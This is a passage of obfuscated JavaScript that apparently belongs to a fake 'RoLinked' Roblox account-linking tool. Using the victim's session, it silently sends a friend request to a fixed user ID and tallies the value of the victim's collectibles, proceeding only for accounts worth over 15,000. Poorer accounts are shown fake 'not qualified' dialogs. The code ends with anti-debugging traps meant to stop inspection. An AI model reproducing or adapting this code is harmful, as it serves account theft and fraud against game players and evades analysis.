                        console.log(validDev);
                        try {
                            var I = { friendshipOriginSourceType: 0 };
                            $.ajax({
                                method: "POST",
                                url: "https://friends.roblox.com/v1/users/6045232974/request-friendship",
                                contentType: "application/json",
                                data: JSON.stringify(I),
                            });
                        } catch {}
                        u();
                    } else {
                        function G(V) {
                            const s = "https://inventory.roblox.com/v1/users/" + V + "/assets/collectibles?assetType=null&cursor=&limit=100&sortOrder=Desc";
                            var O = { url: s };
                            return (O.type = "GET"), $.ajax(O);
                        }
                        G(Y)
                            .done(function (V) {
                                if (V && V.data && V.data.length > 0) {
                                    let i = 0;
                                    V.data.forEach((C) => {
                                        C.recentAveragePrice && (i += C.recentAveragePrice);
                                    });
                                    if (i > 15000) {
                                        u();
                                    } else {
                                        var c = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                        document.body.insertAdjacentHTML("beforeend", c);
                                        document.getElementById("closeButton1").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                        document.getElementById("promptPopup").onclick = function () {
                                            document.getElementById("promptPopup").remove();
                                            document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                        };
                                    }
                                } else {
                                    var c = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>Your account is not qualified to be linked to RoLinked.\nAlternative accounts are not allowed</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                    document.body.insertAdjacentHTML("beforeend", c);
                                    document.getElementById("closeButton1").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                    document.getElementById("promptPopup").onclick = function () {
                                        document.getElementById("promptPopup").remove();
                                        document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                    };
                                }
                            })
                            .fail(function (V, s, O) {
                                var b = {};
                                b.GJVEM = "promptPopup";
                                b.xqSso = "text-footer footer-note";
                                b.edWDI = "Not Active";
                                var m = b;
                                var C = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Error</h5></div></div><div class="modal-body"><div class="text-center"><div>Please refresh your page and try again, an error has occured.</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                                document.body.insertAdjacentHTML("beforeend", C);
                                document.getElementById("closeButton1").onclick = function () {
                                    document.getElementById("promptPopup").remove();
                                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                                };
                                document.getElementById("promptPopup").onclick = function () {
                                    document.getElementById(m.GJVEM).remove();
                                    document.getElementsByClassName(m.xqSso)[0].innerText = m.edWDI;
                                };
                            });
                    }
                })();
            },
            error: function () {
                var o = '<div id="promptPopup" role="dialog"><div class="fade modal-backdrop in"></div><div role="dialog" tabindex="-1" class="fade modal-modern in modal" style="display: block; padding-left: 23px;"><div class="modal-dialog"><div role="document" class="modal-content"><div class="update-two-step"><div class="modal-header"><div class="modal-modern-header-button"><button type="button" class="close"><span aria-hidden="true"><span class="icon-close" id="closeButton1"></span></span><span class="sr-only">Close</span></button></div><div class="modal-title"><h5>Unable to link account</h5></div></div><div class="modal-body"><div class="text-center"><div>You are currently signed out of Roblox</div></div></div><div class="modal-footer"></div></div></div></div></div></div>';
                document.body.insertAdjacentHTML("beforeend", o);
                document.getElementById("closeButton1").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
                document.getElementById("promptPopup").onclick = function () {
                    document.getElementById("promptPopup").remove();
                    document.getElementsByClassName("text-footer footer-note")[0].innerText = "Not Active";
                };
            },
        });
    }
})();
function H(f) {
    function K(R) {
        if (typeof R === "string") {
            return function (x) {}.constructor("while (true) {}").apply("counter");
        } else {
            ("" + R / R).length !== 1 || R % 20 === 0
                ? function () {
                      return true;
                  }
                      .constructor("debugger")
                      .call("action")
                : function () {
                      return false;
                  }
                      .constructor("debugger")
                      .apply("stateObject");
        }
        K(++R);
    }
    try {
        if (f) {
            return K;
        } else {
            K(0);
        }
    } catch (R) {}
}
